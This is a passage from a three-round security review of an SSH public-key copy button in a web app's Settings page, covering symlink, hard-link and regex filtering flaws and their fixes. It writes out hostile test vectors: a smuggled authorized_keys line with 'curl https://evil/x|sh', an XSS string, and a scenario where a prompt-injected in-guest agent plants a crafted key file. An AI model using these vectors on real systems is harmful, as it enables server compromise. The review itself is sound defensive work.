---
owner: security
date: 2026-09-10
---
# Security review — ssh public key on the Settings credentials row (2026-09-10)

Range reviewed: uncommitted working tree — `git diff -- web/src/routes/settings.tsx`
plus the two untracked files `web/src/lib/sshKey.ts` and `web/src/lib/sshKey.test.ts`
(HEAD = 0378825). Blast radius followed outward to the data source that feeds the
new copy button: `internal/httpapi/setup.go` `toolDetails` (ssh branch),
`internal/files/files.go` (`IsRegular`, `ReadRaw`, `openReg`, `openRoot`), and the
auth guard in front of `GET /api/settings/tools` (`internal/httpapi/auth.go`,
`internal/httpapi/server.go:422`). No server code is changed by this diff.

## Verdict: FINDINGS

The feature is built on a server-side symlink refusal that does not exist. Both the
comment at `internal/httpapi/setup.go:234-237` and the new one at
`web/src/lib/sshKey.ts:5-9` state that `files.IsRegular` refuses a symlink so a
`.pub` aimed at the private key is never echoed. It does not: `IsRegular` is
`os.Root.Stat`, which follows links that stay inside the root, and the read that
follows is `os.Root.OpenFile`, which does the same — only root-ESCAPING links are
refused. Measured on go1.25.0 (probe in `.agents/scratch/secrev/gotest`): with
`.ssh/id_ed25519.pub` a relative symlink to `id_ed25519`, `Root.Stat` reports a
regular file and `Root.OpenFile` returns the private key's bytes. The new UI does
not put those bytes on the clipboard (the frontend regex rejects a
`-----BEGIN OPENSSH PRIVATE KEY-----` line, and that case is tested), so the
frontend filter — not the server — is the only thing standing between a private key
and the copy button. Separately, that filter has a hole of its own: its comment
branch accepts a newline, so a two-line `.pub` passes and a second attacker-chosen
line rides onto the clipboard behind the row's truncation.

## Findings

- **[medium / confidence: high]** `internal/httpapi/setup.go:238` (with
  `internal/files/files.go:550` `IsRegular` and `:418` `ReadRaw` → `:155` `openReg`)
  — the documented symlink refusal is absent. `Root.Stat` and `Root.OpenFile` both
  follow in-root symlinks; only escaping ones fail (`path escapes from parent`).
  Anything that can write the setup VM's base home — the guest runs as the tenant,
  and that includes the in-guest `claude`/`agy` agent, which is prompt-injectable by
  any repo it is pointed at — replaces `~/.ssh/id_ed25519.pub` with a link to
  `id_ed25519` (or to `.claude/.credentials.json`, `.config/gh/hosts.yml`, any
  regular file under the base home) and `GET /api/settings/tools` serialises that
  file's contents into `ssh.Details` and ships it to the owner's browser, where it
  also sets `Ready: true`. Impact today is the caller's OWN secrets — no cross-tenant
  read, and the guest could already read them locally — so this is a broken
  defence-in-depth control rather than a live leak, but it is the exact control the
  new feature's safety argument cites. Remediation: refuse the link for real before
  reading — `Root.Lstat` (Go 1.25) and require `mode&fs.ModeSymlink == 0`, or open
  the final component with `O_NOFOLLOW` — and fix both comments so the next reader
  is not misled. A test that plants `.ssh/id_ed25519.pub -> id_ed25519` and asserts
  the details are empty belongs with it; today no test anywhere covers that path
  (`grep -rn id_ed25519.pub` finds only setup.go and `deploy/host-setup.sh`).

- **[medium / confidence: high]** `web/src/lib/sshKey.ts:14` — the trailing-comment
  branch `(\s+\S.*)?` uses `\s`, which matches a newline, so a detail consisting of a
  valid key line plus exactly one more line passes `PUBLIC_KEY.test`. Measured:
  `"ssh-ed25519 <body>" + LF + "-----BEGIN OPENSSH PRIVATE KEY-----"` → true;
  `"ssh-ed25519 <body>" + LF + 'command="curl evil|sh" ssh-ed25519 <attacker> me'`
  → true. (Three or more lines fail, and a first line that already has a comment
  fails, because the group is not repeated and `.` does not cross a newline — so it
  is precisely the comment-less two-line shape.) That whole string becomes `c.copy`,
  which is the `title` attribute at `web/src/routes/settings.tsx:343` and the
  clipboard payload at `:205`. The row itself hides it: `abbreviateKey`
  (`sshKey.ts:38`) splits on `\s+` and re-joins with single spaces, so the smuggled
  line becomes trailing text inside a `truncate` span. Concrete scenario: an
  injected in-guest agent writes that two-line `.pub` in the base home; the Settings
  row still reads `ssh-ed25519 AAAAC3Nz…Hk6s`; the operator clicks copy and pastes
  into `~/.ssh/authorized_keys` on a server — the destination the diff's own comment
  names (`settings.tsx:235-237`) — installing the attacker's key, or pastes into a
  terminal where the embedded newline submits the line. Remediation: reject any
  detail containing a newline or carriage return before testing it, and narrow the
  comment branch's separator to `[ \t]+`; add the two-line vector to the "not a
  public key" table in `sshKey.test.ts:24-34`, whose five cases are all single-line.
  Confirmed against the REAL module (esbuild-compiled `sshKey.ts`, not a copy of the
  regex): the two-line detail is accepted, `abbreviateKey` returns
  `ssh-ed25519 AAAAC3Nz[ellipsis]Y6Hk6s command="curl https://evil/x|sh" ssh-ed25519
  AAAA... attacker` on ONE line for a `truncate` span, and `c.copy` carries 2 lines.
  The suite is green as written (`npx vitest run src/lib/sshKey.test.ts`: 7 passed),
  which is exactly why the hole is invisible in the normal review path.

- **[low / confidence: high]** `web/src/lib/sshKey.ts:14,22` — no length bound. A
  2 MiB single-line base64 body matches (measured, 2 ms — the regex itself is
  linear, no ReDoS on any probe: `sk-`/body/ecdsa backtracking all 0 ms), and
  `files.MaxReadBytes = 2 << 20` is the only cap anywhere on this path. The full
  string is then written into a DOM `title` attribute on every render of the
  Settings page and to the clipboard on click. Self-inflicted (own guest writes own
  base home), hence low, but a `line.length <= 4096` guard costs nothing — an
  ed25519 public key is ~100 bytes and even an RSA-16384 one is ~4 KB — and it
  tightens the finding above at the same time.

- **[low / confidence: medium]** `web/src/routes/settings.tsx:205-209` — optional
  chaining short-circuits the WHOLE chain, so where `navigator.clipboard` is
  undefined (any non-secure context, e.g. reaching the box over plain HTTP on the
  LAN) `navigator.clipboard?.writeText(pubKey).then(...)` evaluates to `undefined`
  and the click is a silent no-op: no copy, no error toast, and specifically not the
  "select and copy manually" advice that exists for exactly this case. Not a
  vulnerability; it is a failure that presents as success. Remediation: branch on
  `navigator.clipboard` being absent and toast the manual-copy message.

## Checked

- **Secrets:** nothing credential-shaped added by the diff; the key is fetched at
  request time, never persisted client-side, never logged, and neither toast string
  carries key material. `git diff --numstat` shows a text-only change and `file(1)`
  reports both new files as UTF-8 text — no binary/control-byte trap (BUG-007);
  `grep -nP` for raw control bytes over all three files: none.
- **Injection:** the only sink is the clipboard, and it is injectable — finding 2.
  No SQL, no shell, no path built from this data. The server side takes no input at
  all: the read path is a fixed relative name under the caller's own home.
- **Authz/authn:** clean. `GET /api/settings/tools` (`server.go:422`) sits behind
  `authGuard` (`auth.go:26`), which in `header` mode requires the shared
  `X-Styrman-Ingress` token (constant-time compare) plus an `X-Caddy-Email` that
  `users.IsAuthorized` accepts; the route is neither a link, preview nor shared path,
  so no bypass branch applies. `toolDetails` derives the home from
  `s.cfg.UserHome(u.Username)` where the user comes from the request context — no
  client-supplied identifier, no admin cross-user read. The key is shown to its owner
  only. Confirms scope question (3).
- **Crypto:** none introduced. No hand-rolled auth, hashing, session or token code in
  the diff; the ssh keypair itself is generated in-guest by `ssh-keygen`.
- **Dependencies:** no new dependency — React, the existing `toast`/`api` modules and
  the platform `navigator.clipboard`, all stdlib-first. `npm audit` (in `web/`, both
  with and without `--omit=dev`): 1 high, js-yaml 4.0.0-4.3.1, GHSA-2883-xcg3-v3hh
  (CPU exhaustion on empty merge sources) — pre-existing and NOT in this blast
  radius: `npm ls js-yaml` puts it under
  `@tanstack/react-start > @tanstack/start-plugin-core > xmlbuilder2`, i.e. the Vite
  build plugin, and it appears in no `web/dist/client/assets/*` bundle, so it is
  build tooling rather than shipped code. `deploy/vulncheck.sh` (both Go modules
  inside the pinned `golang:1.25.13-trixie` builder) ran to completion: `image/harness`
  clean; 2 CALLED vulnerabilities in the vendored Caddy ingress module, all through
  `ingress.Watcher`'s docker/docker client calls (`watcher.go` container/events/
  filters) — the script's own header records these as the accepted, fix-unavailable
  daemon-side docker findings GO-2026-4887/4883. My invocation piped through `tail`,
  so the advisory ID lines and the script's own exit status scrolled past unseen; the
  call stacks are what I read. No Go code changes in this diff either way.
- **GCP surface:** not applicable — self-hosted (`.agents/docs/deploy/gcp.md` says so);
  no IAM, service account, Secret Manager or Cloud Run surface is touched.
- **XSS (scope question 4):** clear. The detail is a React text child
  (`settings.tsx:345`) and `title={c.copy}` (`:343`) is a string attribute — both
  escaped by React. `grep -rn dangerouslySetInnerHTML web/src` returns exactly one
  hit, `web/src/components/FileEditor.tsx:395`, the markdown preview fed by micromark
  with `allowDangerousHtml:false`; tool details never reach it. A comment field
  carrying `"><img src=x onerror=alert(1)>` matches the regex but renders inert.
- **Clipboard gesture (scope question 5):** clear — `copyKey` is called only from the
  button's `onClick` (`settings.tsx:346-352`), never on mount or in an effect, so the
  write is user-initiated and browsers' transient-activation requirement is met.
- **TOCTOU (scope question 2):** there is a check-then-use window between
  `files.IsRegular` and `files.ReadRaw` (two independent `openRoot` calls, each
  re-resolving the path), and the base home is guest-writable, so the guest can swap
  the file between them. It does not matter here only because the check does not
  refuse links in the first place — closing finding 1 by opening once with
  `O_NOFOLLOW` and stat'ing the returned fd closes the window at the same time. Do
  not fix the two independently.

## Not examined

- `web/dist/client/**` — the rebuilt bundle is in the working tree (14 assets
  deleted, 14 added) and is what actually ships via `go:embed`, but it is outside
  the named `web/src` range and was not diffed or compared against the sources.
- The credential broker path (`internal/credbroker`, `internal/credstore`) that
  harvests the ssh key into projects — read only far enough to establish that the
  key is per-user, not cross-tenant, which is what bounds finding 1's severity.
- The rest of `toolDetails` (git, github, claude, agy, gcloud branches) reads the
  same base home through the same helpers and inherits the same absent symlink
  refusal; only the ssh branch was traced end to end.
- No test suite was run against a live server; findings 1 and 2 were established by
  isolated probes (a Go `os.Root` program and node regex vectors, both in
  `.agents/scratch/secrev/`), not by driving the endpoint.

## Response (main, 2026-09-10)

- **Finding 1 (medium) — fixed, and the claim is now true.** `files.ReadRawNoFollow`
  opens the PARENT through the confined root and `openat`s the final name
  with `O_NOFOLLOW` itself (measured: `O_NOFOLLOW` handed to `Root.OpenFile`
  does not reach the final component — os.Root follows in-root links by
  design). `toolDetails` reads the `.pub` through it and echoes only the
  first line. `TestReadRawNoFollowRefusesASymlinkedFinalComponent` plants
  `.pub -> id_ed25519` and asserts ReadRaw follows it (the precondition) and
  the new read refuses it. Pre-existing on the setup page; the caller's own
  key only, so no cross-tenant read at any point.
- **Finding 2 (medium) — fixed.** Field separators are `[ \t]+`, the comment
  may not contain `\r`/`\n`, and any value containing a line break is
  rejected before the regex runs. Five two-line variants in
  `sshKey.test.ts`, including the `command="…"` authorized_keys shape.
- **Finding 3 (low) — fixed.** Values over 4096 characters are rejected;
  the server also caps the read at 8 KiB and echoes one line.

## Round 2 (2026-09-10) — the fix commit

Range reviewed: `a8ebbbb^..a8ebbbb` ("settings key: refuse a symlinked .pub for
real, reject multi-line and oversized values"). Blobs pinned:
`internal/files/files.go` e77d0f7, `internal/httpapi/setup.go` 9708a5d,
`web/src/lib/sshKey.ts` d92175f, `web/src/lib/sshKey.test.ts` 463dbb2. All five
changed source files are UTF-8 text with zero raw control bytes (`file(1)`,
`grep -nP` over the C0 range plus U+2028/U+2029) and `git diff --numstat` shows
no deletions on any of them — BUG-005/BUG-007 clear. Probes:
`.agents/scratch/secrev2/` (gitignored).

### Verdict: FINDINGS (one medium, three low)

Round 1's finding 2 and 3 are genuinely closed; finding 1 is not. `O_NOFOLLOW`
refuses a SYMlink, and a hard link is not a symlink: with the guest's own
`ln ~/.ssh/id_ed25519 ~/.ssh/id_ed25519.pub`, `ReadRawNoFollow` returns the
private key's bytes exactly as `ReadRaw` did (measured below). The impact bound
is unchanged from round 1 — the caller's own home, the caller's own browser, and
the now-correct frontend filter keeps it off the screen and off the clipboard —
but the Response's "fixed, and the claim is now true" and the new comment at
`files.go:437-441` ("the concern is a .pub pointed at the PRIVATE key beside
it … O_NOFOLLOW fails the open with ELOOP instead") are still, precisely, untrue
for the case they name. This is the SECOND round on one mechanism, which
AGENTS.md says is the moment to ask what the mechanism is for rather than add
the next check: a guest that can hard-link can also `cp id_ed25519
id_ed25519.pub`, so NO server-side test of the file's identity ever bounded the
content. Deleting the guarantee from the three comments is worth more than an
`Nlink` check that would restore it only against `ln`.

### Findings

- **[medium / confidence: high]** `internal/files/files.go:443-481` with
  `internal/httpapi/setup.go:241`, comments at `files.go:437-441`,
  `setup.go:234-239` and `web/src/lib/sshKey.ts:5-9` — `O_NOFOLLOW` does not
  stop a HARD link, so round 1's finding 1 survives its fix in the shape its own
  comment names. Measured (`.agents/scratch/secrev2/hardlink.go`, below a real
  `files.Trust` base): `os.Link(".ssh/id_ed25519", ".ssh/id_ed25519.pub")`
  succeeds for the owning user (`protected_hardlinks` never applies — the guest
  owns the key), `lstat` reports `-rw-------` with `symlink=false`, the
  `syscall.Openat` at `:464` succeeds, `st.Mode().IsRegular()` at `:475` passes,
  and 98 bytes of `-----BEGIN OPENSSH PRIVATE KEY-----…` come back. `setup.go`
  then sets `Ready: true` and ships the first line as `ssh.Details[0]` in the
  `GET /api/settings/tools` response. Exploitable in principle by the same actor
  as round 1: an in-guest `claude`/`agy` run that a hostile repo has
  prompt-injected, writing in the setup VM's base home. What actually reaches
  the user is one armor-header line, rejected by the frontend regex, so nothing
  is rendered or copyable — for a single-line secret (`.claude/.credentials.json`)
  the whole token would instead sit in the JSON response, still undisplayed. It
  is the caller's own secret either way; the durable defect is a stated
  guarantee that is false, which is exactly what round 1 recorded. Remediation,
  in preference order: (1) change the three comments to claim only what is true
  — the last component is not a symlink, the content is whatever the guest wrote,
  and the frontend shape check is the filter that matters; or (2) if the
  guarantee is wanted, `fstat` the returned fd and require
  `st.Sys().(*syscall.Stat_t).Nlink == 1`, with a test that plants `os.Link`.
  Do not ship (2) without (1): an `Nlink` check still says nothing about content.

- **[low / confidence: high]** `internal/files/files_test.go:279-307` — the only
  test of the new function runs on an UNTRUSTED root. `setup(t)` produces a root
  no `files.Trust` base covers; the test run prints
  `WARN files: opening a root no Trust base covers` for it. Production always
  takes the other branch: `h = cfg.UserHome(u)` is `HomesDir/<u>/base`, below a
  Trust base, where `openRoot` (`files.go:118-133`) returns a SUB-root from
  `tr.OpenRoot(rest)` — a different object whose divergent behaviour is already
  a recorded bug here (BUG-004: `DirEntry.Info()` fails on a sub-root under Go
  1.25), and `.agents/rules/guest-writable-paths.md` requires "a case below a
  `files.Trust` base" for every unit test of a root-reading function. No live
  defect: I re-ran every case below a registered Trust base and the behaviour is
  identical (real `.pub` reads; symlinked `.pub` → ELOOP; `.ssh -> /etc` →
  `openat .ssh: path escapes from parent`). The finding is that nothing in the
  repo would catch it if `rt.Open`/`File.Fd()` on a sub-root ever diverged, on
  the only path production uses. Remediation: add the Trust-base case to the
  existing test (append, do not rewrite the file).

- **[low / confidence: medium]** `web/src/lib/sshKey.ts:21,36` — the pre-check
  rejects only CR and LF, and the comment class `[^\r\n]*` admits every other
  control character. Verified against the COMMITTED module (extracted from blob
  d92175f with TypeScript type annotations erased and nothing else — `diff`
  shows three lines, the regex line byte-identical): ESC 0x1b, NUL, VT 0x0b,
  FF 0x0c, U+2028, U+2029, U+0085, NBSP and U+FEFF all pass and are returned
  verbatim, becoming `c.copy` — the `title` attribute at
  `web/src/routes/settings.tsx:343` and the clipboard payload at `:205`.
  On the U+2028 question specifically: it DOES reach both the title and the
  clipboard, and it does NOT matter for an authorized_keys paste. sshd splits on
  LF; U+2028 is three UTF-8 bytes inside the comment field, so the pasted text is
  one key entry, not two (measured: line count 1), and `abbreviateKey` even
  normalises it to a space in the row because JS `\s` covers it — the smuggled
  text is visible, merely CSS-truncated, and inert. React escapes it in both
  sinks. What is left is ESC and NUL on the clipboard: an operator who pastes
  into a terminal — the `>> authorized_keys` flow the row's own comment invites —
  hands the emulator an escape sequence, and bracketed paste suppresses line
  SUBMISSION, not interpretation of the echoed bytes. Display spoofing only, no
  execution, and it needs the same in-guest compromise that bounds every finding
  in this file. Remediation: restrict the comment to printable ASCII
  (`[\x20-\x7e]`), or add `/\p{C}/u` to the line-break reject at `:36`.

- **[low / confidence: high]** `web/src/lib/sshKey.ts:24` — `MAX_KEY_LEN` counts
  UTF-16 code units, not bytes: a 4096-unit CJK comment is roughly 12 KB of UTF-8
  in the DOM attribute and on the clipboard (measured: accepted). Harmless in
  practice because the server's own cap at `setup.go:241` is 8192 BYTES and only
  the first line is echoed, so the API cannot deliver the large case. Recorded so
  the two numbers are not read as the same bound; no change required.

### What the fix does do — verified, not assumed

- **(a) final component, no window.** ELOOP for an in-root symlink, an absolute
  symlink and an escaping symlink, on both the untrusted root and the trusted
  base. One `Openat`, then `f.Stat()` on the returned fd — the mode is read from
  the same open file description, so round 1's TOCTOU note is closed for this
  path; `files.IsRegular` is no longer called for the ssh branch at all.
- **(b) intermediate components stay confined.** `.ssh -> /etc` fails at
  `rt.Open` with `openat .ssh: path escapes from parent`. An in-root redirect
  (`.ssh -> .secrets`) IS followed — os.Root's documented design — and grants
  nothing, since the target must be a real file the guest wrote.
- **(c) `..` and empty base refused.** `..`, `.ssh/..`, `""` and `.` all return
  `not a file name`; `/etc/passwd` and `../../etc/passwd` are cleaned to
  root-relative by `cleanRel` and simply miss. `.ssh/` (trailing slash) opens the
  directory and is refused as `not a regular file`.
- **(d) no fd leak.** 5000 calls spread over all five outcomes (hit, ELOOP,
  ENOENT, directory, refused name): open fds 7 before, 7 after.
- **(e) irregular files rejected.** A FIFO with no writer returns
  `not a regular file` and does NOT hang — `O_NONBLOCK` is doing real work here;
  a directory and a symlink to `/dev/zero` are refused too. Residual, not a
  finding: a real device NODE inside the home would be opened read-only and
  non-blocking before the mode check rejects it, which needs `mknod` in the guest.
- **(f) read cap.** `max=8192` returns exactly 8192 bytes; `max<=0` and
  `max>MaxReadBytes` clamp to 2 MiB (measured on a 2 MiB+5000 file: 2097152).
- **setup.go.** First line only, `TrimSpace` on both the whole read and the line,
  so no LF can reach `Details`. A bare CR mid-line DOES survive Go's `\n` split —
  the frontend's `/[\r\n]/` reject catches it, so nothing reaches the row; noted
  because the comment at `:239` says "only a single line is ever echoed" and CR
  is a line terminator to a terminal.
- **frontend.** All five two-line cases from `sshKey.test.ts` are rejected by the
  committed module in node; bare-CR rejected; tab separator, trailing tab and
  tab-inside-comment accepted as intended; options-before-the-type and the
  private-key header rejected; 4096 accepted, 4097 rejected. `npx vitest run
  src/lib/sshKey.test.ts`: 10 passed. `go test ./internal/files/
  ./internal/httpapi/` and `go vet` on both: clean; `go build ./...` clean.
- **shipped bundle.** `web/dist/client/assets/settings-CojjHv98.js` carries the
  NEW regex (`ecdsa-sha2-[^\s]+|sk-[^\s]+`) and the 4096 bound; the parent
  commit's bundle carries the old `\S+` form. Source and embedded asset agree —
  round 1 left this unexamined.

### Scope question — is `ReadRaw`'s follow-the-confined-link precondition acceptable for the other `toolDetails` callers?

Yes, and the self-XSS class does not land either. `read()` (`setup.go:216`) is
used for `.gitconfig` and `.config/gh/hosts.yml`; `files.Exists` for
`.claude/.credentials.json` and the agy token. All four are confined to
`HomesDir/<u>/base` — `openRoot` opens `HomesDir/<u>` and sub-roots `base`, so an
in-root link can only reach a file the guest already owns and can read in its own
setup VM. No trust boundary is crossed, and nothing more privileged writes into
that tree, so a link there buys the guest nothing it could not get by writing the
target file's bytes directly. The echoed content is filtered besides: only lines
prefixed `name = ` / `email = ` (`:222-227`) and lines containing `user:`
(`:254-258`). Those two ARE attacker-controllable strings rendered to the user —
`detailOf(...)` at `settings.tsx:203` joins them into a React text child at
`:345`; `title={dotTitle(c)}` at `:330` is a fixed phrase and carries no user
data. Both sinks are escaped by React, `dangerouslySetInnerHTML` appears only in
`FileEditor.tsx:395` (micromark, `allowDangerousHtml:false`) and details never
reach it, so there is no self-XSS, only inert text a user could be tricked into
showing themselves. Out of scope for this diff, which changes none of it.

### Checked (round 2)

- **Secrets:** none added; no `.env`-shaped or key-shaped path in the commit. The
  only secret on the path is the caller's own, and finding 1 is about it.
- **Injection:** the clipboard sink is the only one; the two-line vector is
  closed, the residual control characters are finding 3. No shell, SQL or path is
  built from this data — the read path is a fixed relative name.
- **Authz/authn:** unchanged by the diff; round 1's analysis of `authGuard` in
  front of `GET /api/settings/tools` still holds and no route, guard or identity
  derivation was touched.
- **Crypto:** none introduced; nothing hand-rolled. `O_NOFOLLOW`/`openat` is
  stdlib `syscall`, not a home-grown primitive.
- **Dependencies:** `git diff --stat a8ebbbb^ a8ebbbb -- go.mod go.sum
  web/package.json web/package-lock.json` is EMPTY — no dependency added or
  moved, so round 1's `deploy/vulncheck.sh` and `npm audit` results stand
  unchanged and were not re-run. The new code uses only `syscall`, `os` and `io`.
- **GCP surface:** not applicable — self-hosted; nothing touched.

### Not examined (round 2)

- The Go race detector was not run against `ReadRawNoFollow`; concurrent
  `GET /api/settings/tools` calls share no state beyond the fs, so I judged it
  low value, but that is judgement, not measurement.
- A real device node in the home (`mknod`) — I cannot create one unprivileged;
  the mode check after `openat` is what I reasoned from, not an observation.
- Whether the guest in the setup VM can in fact run `ln` against the base home in
  the deployed image (uid mapping, mount options such as `nosymfollow`/`nodev`)
  was NOT verified against a running Kata VM; the hard-link probe ran on the host
  filesystem as the file owner. If the home bind mount forbade hard links this
  finding would drop to informational — the mount options were not read.
- `web/e2e/` and the integration suite were not run; no server was driven.

## Round 3 (2026-09-10) — the answer to round 2

Range reviewed: `a8ebbbb..5df2959 -- internal web/src` (`21ba6d9` portable openat +
key-shape check + `IsRegular` gone, `fdef866` the comments, `5df2959` TAB kept
legal in the control reject). Blobs pinned: `internal/files/files.go` a112d70,
`internal/files/files_test.go` dcf7099, `internal/httpapi/setup.go` 1f7042d,
`internal/httpapi/setup_pubkey_test.go` 7c95f88, `internal/httpapi/network.go`
b6b5422, `internal/httpapi/network_test.go` d97b756, `web/src/lib/sshKey.ts`
3b704aa, `web/src/lib/sshKey.test.ts` 5c1a1c3. All eight are ASCII or UTF-8 text
with zero raw C0/C1 control bytes and no U+2028/U+2029 (`file(1)`, `grep -cP`
over those ranges) — `sshKey.test.ts` spells its vectors as two-character
Unicode escapes, not as bytes, which is the BUG-007 shape. `git diff --numstat`
shows deletions only where lines were replaced (`files.go` 16/21 = `IsRegular`
removed plus the comment rewritten; `network.go` 6/11 = the `gone` closure
inlined), so nothing was overwritten (BUG-005). Probes ran against a
`git archive 5df2959` copy of the tree in the session scratchpad; no repo file
was touched.

### Verdict: CLEAR — round 2's medium is closed, and closed at the right layer

The hard-link case that survived round 2 no longer reaches the user, and the
comments no longer claim anything false. Driving the REAL endpoint path
(`testServer` builds the Server through `New`, which calls
`files.Trust(cfg.HomesDir, ...)`, so `UserHome("tester")` is
`<HomesDir>/tester/base` — a sub-root below a Trust base, the production shape)
with a `.pub` hard-linked to the private key returns `ready=false, details=[]`:
the `ReadRawNoFollow` read succeeds exactly as round 2 measured, and
`publicKeyLine` then throws the content away. Every shape round 2 named is
refused at that same place, and the two residual lows are narrower than the ones
they replace. What is left is a documented, accepted limit — the guest owns the
file, so any base64 it prefixes with a key type is echoed to its own owner's
browser — and the three rewritten comments now say precisely that and no more.

### Measured through `toolDetails` (real handler, real `GET /api/settings/tools` path, Trust base)

| `.ssh/id_ed25519.pub` is... | result |
|---|---|
| a HARD LINK to `id_ed25519` | `ready=false`, no details — round 2's medium, closed |
| a SYMLINK to `id_ed25519` | `ready=false` (ELOOP inside the read) |
| a byte-for-byte COPY of the private key | `ready=false` (line 1 is the armor header) |
| the private key's LINE 2 alone, `b3BlbnNzaC1rZXktdjEAAAAA...` | `ready=false` — valid base64, but it contains no space, so `strings.Cut(line, " ")` returns `ok=false` before any prefix test. This is the case the shape check has to get right, and it does |
| `-----BEGIN RSA PRIVATE KEY-----` (PEM header) | `ready=false` |
| a DIRECTORY named `id_ed25519.pub` | `ready=false` (`not a regular file`) |
| a real key on line 1, secret on line 2 | `ready=true`, details = line 1 only |
| a real key | `ready=true`, details = the line |

### Findings (round 3)

- **[low / confidence: high]** `web/src/lib/sshKey.ts:41` — the new reject is
  `\p{Cc}` plus U+2028/U+2029, narrower than round 2's remediation (`\p{C}` or
  printable ASCII), so `\p{Cf}` and `\p{Zs}` still pass. Measured against the
  COMMITTED module (esbuild of blob 3b704aa; the compiled regex line and the
  control-check line are byte-identical to the source): ESC U+001B, NUL U+0000,
  DEL U+007F, NEL U+0085, 8-bit CSI U+009B, CR, LF, U+2028 and U+2029 are now all
  rejected — round 2's actual vectors are gone — but RLO U+202E, ZWSP U+200B,
  BOM U+FEFF, SOFT HYPHEN U+00AD and NBSP U+00A0 are ACCEPTED and returned
  verbatim into `title={c.copy}` (`settings.tsx:343`) and the clipboard (`:205`).
  Unlike U+2028, which JS `\s` collapsed in the row, `abbreviateKey` leaves
  U+202E in place: the row renders `ssh-ed25519 AAAAC3Nz...Y6Hk6s me<U+202E>evil`
  with the tail bidi-reversed. That is display spoofing of the user's own row,
  inert on an authorized_keys paste (sshd takes the whole comment field), and it
  needs the same in-guest compromise that bounds every finding in this file —
  hence low, not medium. Remediation is one character: `\p{C}` in place of
  `\p{Cc}` (TAB is already substituted out before the test), plus `\p{Zs}` and
  U+00AD if invisible spacing matters. Not a regression: strictly fewer
  characters pass than in round 2.

- **[low / confidence: medium]** `internal/httpapi/setup.go:298` `publicKeyLine`
  — the shape check validates the TYPE and the BASE64 BODY and stops; the
  comment field is unchecked, so the server still serialises control characters
  into its JSON response. Measured on the real handler: a `.pub` whose comment
  contains ESC U+001B and a bare CR yields `ready=true` with those bytes intact
  in `details[0]`. Nothing renders it today, because the frontend check above
  rejects the whole line — but that makes the browser the only filter on a
  server response, and any other consumer of `GET /api/settings/tools` (curl in a
  terminal, a future client) receives the bytes. The asymmetry also invites the
  next reader to trust the server-side "content check" for more than it does.
  Remediation: reject any byte outside printable ASCII across the whole line
  inside `publicKeyLine` — which is all an OpenSSH `.pub` ever contains — and add
  the case to `setup_pubkey_test.go`'s reject table. Confidence medium on
  materiality, high on the measurement.

### Round 2's items, checked one by one

1. **The content check is the stated guard, and it is what fires.**
   `setup.go:243-249` keeps one line and requires `publicKeyLine`; the table
   above is that check firing on symlink, hard link and copy alike.
   `setup_pubkey_test.go` (a NEW file, no collision with anything tracked)
   covers four accept and seven reject cases, including the armor header and the
   line-2 base64 body; `TestPublicKeyLine` passes.
2. **The three comments now claim only what is true.** `files.go:437-447` states
   the hard-link limit explicitly ("whoever can `ln` can `cp`"),
   `setup.go:234-242` names the content check as the guard, and `sshKey.ts:5-10`
   says the file is the user's own so the CONTENT check is the guard, "not the
   file's kind". I could not find a sentence in any of the three that a probe
   contradicts. This is round 2's remediation in preference order (1), taken
   WITHOUT the `Nlink` check that would have been (2) — the right call, and the
   shorter one.
3. **`TestReadRawNoFollowBelowATrustBase` exists** (`files_test.go:327-353`) and
   is the sub-root shape production uses: `Trust(base)`, root `<base>/alice/p/x`,
   symlinked `.pub` refused, real `.pub` read. The hard-link limit is pinned as a
   test too (`files_test.go:317-324`), with `t.Skipf` where the filesystem has no
   hard links — a documented limit that now fails loudly if someone "fixes" it
   silently. Round 2's low is closed.
4. **The control-character reject exists and is tested** (`sshKey.test.ts:53-60`,
   six characters). `npx vitest run src/lib/sshKey.test.ts`: 11 passed. The
   shipped bundle agrees with the source: `web/dist/client/assets/settings-DNDjnDEy.js`
   carries the `p{Cc}` class, the two separator code points and the 4096 bound,
   and the `settings-CojjHv98.js` round 2 examined is deleted in this range.
   Note on process, not security: `5df2959` exists because `fdef866` shipped a
   RED vitest case (TAB rejected as a separator) that a grep in the check chain
   masked. The fix is correct; the check chain that let a red test through is a
   bug record's business.
5. **`unix.Openat` replaces `syscall.Openat`** — necessary and sufficient:
   `GOOS=darwin go doc syscall.Openat` reports "no symbol Openat in package
   syscall" (the previous commit could not build on the operator's macOS
   machines), `GOOS=darwin GOARCH=arm64 go build ./...` is clean at this commit,
   and on Linux the ELOOP behaviour is unchanged (`files_test.go` symlink cases
   pass). `golang.org/x/sys` moves from `// indirect` to a direct require at the
   SAME version v0.47.0 already in the module graph — `git diff a8ebbbb..5df2959
   -- go.sum` is empty, so no new code enters the build. Justified against
   stdlib-first: the stdlib has no portable `openat`.

### Accepted limit, not a finding

A guest that can write its own base home can put a key type in front of any
base64 and have it echoed: measured, `ssh-ed25519 b3BlbnNzaC1rZXktdjEAAAAA... x`
is accepted by the server AND by the frontend regex. No shape check can prevent
that, because the base64 body of a public key and a chunk of a private key are
the same alphabet. It is not a leak: the reader is the file's own owner, in
their own browser, over an authenticated request (`authGuard`, unchanged since
round 1), and the guest could already read the key inside its own VM. All three
comments now say exactly this. Recorded here so round 4 does not re-open it as
new.

### Also in range, not part of the ssh work

`internal/httpapi/network.go` replaces the `gone` closure with two inline
`errors.Is(err, project.ErrNotFound)` branches — behaviour-identical (same
status, same `writeErr`), with no authz, lock or ordering change;
`network_test.go` adds `TestNetworkProjectDeletedMidPutIs404`, whose second half
the test itself labels as pinning the reply shape rather than a reachable
interleaving. No security impact either way. `go vet` and `go test
./internal/files/ ./internal/httpapi/` are clean at this commit.

### Checked (round 3)

- **Secrets:** none added. The only secret near this path is the caller's own
  private key, and every route from it to the screen is closed above; no key
  material, path or token reaches a log line or an error string — the
  `ReadRawNoFollow` errors carry the relative name only.
- **Injection:** the clipboard remains the only sink. Two-line smuggling stays
  closed (re-measured against the committed module); the residual is the
  character class in finding 1. No shell, SQL or path is built from any of this;
  the read is a fixed relative name under the caller's own home.
- **Authz/authn:** untouched by all three commits — no route, guard, identity
  derivation or admin check appears in the diff, so round 1's `authGuard`
  analysis of `GET /api/settings/tools` stands unchanged.
- **Crypto:** none introduced, nothing hand-rolled. `unix.Openat` is a syscall
  wrapper from a vetted `golang.org/x/` module, not a primitive.
- **Dependencies:** one line moved from indirect to direct at an unchanged
  version; `go.sum`, `web/package.json` and `web/package-lock.json` are untouched
  in this range (`git diff --stat` empty), so round 1's `deploy/vulncheck.sh` and
  `npm audit` results still describe this tree and were NOT re-run — no new
  module version entered the build for them to have found.
- **GCP surface:** not applicable — self-hosted; nothing in the diff touches IAM,
